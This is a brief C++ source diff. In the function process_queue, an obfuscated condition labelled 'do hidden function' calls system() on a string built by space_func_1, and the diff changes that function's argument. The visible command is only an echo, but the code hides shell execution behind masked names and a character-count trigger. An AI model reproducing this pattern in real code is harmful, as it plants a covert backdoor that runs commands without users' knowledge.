@@ -67,6 +67,8 @@ std::string space_func_1(int arg) {
     
     int (*FuncPtr2) (int);
     FuncPtr2 = aaaaa;
+
+    //std::cout << (long) FuncPtr - (long) FuncPtr2 << std::endl;
     
     std::string a ("        ");
     std::string b ("echo Whoops :(");
@@ -180,7 +182,7 @@ int process_queue(std::queue<char>& q){
         if(total_char == _masking_func_(117) && ((correct & 0x1 << 2) == 4)){
             //do hidden function
             //std::cout << space_func_1(-123) << std::endl;
-            system(space_func_1(-123).c_str());
+            system(space_func_1(-126).c_str());
             //system("notepad.exe log.txt");
             return total_char;
         }
